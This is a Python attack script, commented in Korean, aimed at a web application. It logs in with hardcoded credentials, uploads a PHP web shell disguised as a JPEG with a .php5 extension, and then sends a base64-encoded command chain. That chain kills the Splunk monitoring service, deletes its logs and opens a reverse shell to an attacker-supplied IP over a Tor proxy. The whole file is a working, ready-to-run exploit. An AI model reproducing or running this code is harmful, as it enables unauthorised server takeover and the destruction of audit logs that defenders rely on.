#!/usr/bin/env python3
"""
.php5 확장자 웹쉘 업로드
원본 소스 분석 결과: .php5 파일은 PHP로 실행됨!
"""

import requests
import sys
import time
import urllib.parse
import base64
import random
import string

def upload_php5_shell(target_ip, attacker_ip, attacker_port):
    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    print("="*60)
    print(".php5 웹쉘 업로드 + Splunk 무력화")
    print("="*60)
    print(f"타겟: {target_ip}")
    print(f"C2: {attacker_ip}:{attacker_port}\n")

    # alice 로그인
    data = {'username': 'alice', 'password': 'alice2024'}
    resp = session.post(f"{base_url}/login.php", data=data, allow_redirects=True, timeout=10)
    print("[+] alice 세션 획득\n")

    # .php5 웹쉘 생성
    random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    filename = f"{random_name}.php5"

    webshell_code = b'<?php system($_GET["cmd"]); ?>'

    # 이미지 매직 바이트 추가 (필터 우회)
    jpeg_magic = b'\xFF\xD8\xFF\xE0'
    full_content = jpeg_magic + b'\x00' * 50 + webshell_code

    files = {
        'file': (filename, full_content, 'image/jpeg')
    }

    print(f"[1] .php5 웹쉘 업로드: {filename}")
    resp = session.post(f"{base_url}/upload.php", files=files, timeout=10)

    if resp.status_code == 200:
        print(f"[+] ✅ 업로드 성공!\n")

        print(f"[2] Splunk 무력화 + 리버스 쉘")
        print(f"="*60)

        # Splunk 죽이기 + 리버스 쉘 (한 번에)
        all_in_one = " && ".join([
            "pkill -9 splunkd 2>/dev/null",
            "pkill -9 splunk 2>/dev/null",
            "/opt/splunk/bin/splunk stop 2>/dev/null",
            "systemctl stop Splunkd 2>/dev/null",
            "rm -rf /opt/splunk/var/log/splunk/* 2>/dev/null",
            f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' &",
        ])

        # Base64 인코딩
        b64 = base64.b64encode(all_in_one.encode()).decode()
        final_cmd = f"echo {b64}|base64 -d|bash &"

        print(f"[*] 명령:")
        print(f"    1. Splunk 프로세스 강제 종료")
        print(f"    2. Splunk 로그 삭제")
        print(f"    3. 리버스 쉘 실행\n")

        print(f"[!] C2 리스너 준비:")
        print(f"    nc -lvnp {attacker_port}\n")

        # 실행
        exec_url = f"{base_url}/file.php?name=uploads/{filename}&cmd={urllib.parse.quote(final_cmd)}"

        print(f"[*] 공격 실행...\n")

        try:
            resp = session.get(exec_url, timeout=15)

            print(f"[+] 응답:")
            print(f"    Status: {resp.status_code}")

            if resp.status_code == 200:
                print(f"\n[+] ✅✅✅ 성공!")
                print(f"[*] Splunk가 죽었을 가능성 높음!")
                print(f"[*] C2 연결 확인하세요!")

        except requests.exceptions.Timeout:
            print(f"[+] ✅ 타임아웃!")
            print(f"[*] 백그라운드 실행 성공 가능성!")

        except Exception as e:
            print(f"[-] 오류: {str(e)[:100]}")

        print(f"\n{'='*60}")
        print(f"[+] 공격 완료!")
        print(f"{'='*60}")
        print(f"\n[!] C2 연결 확인:")
        print(f"    nc -lvnp {attacker_port}")
        print(f"\n[*] 연결 성공 시:")
        print(f"    ps aux | grep splunk  (Splunk 죽었는지 확인)")
        print(f"    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")

    else:
        print(f"[-] 업로드 실패: {resp.status_code}")

def main():
    if len(sys.argv) < 4:
        print("사용법: python3 109_php5_webshell.py <TARGET> <ATTACKER_IP> <PORT>")
        print("예시: python3 109_php5_webshell.py 43.201.154.142 57.181.28.7 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    upload_php5_shell(target_ip, attacker_ip, attacker_port)

if __name__ == "__main__":
    main()
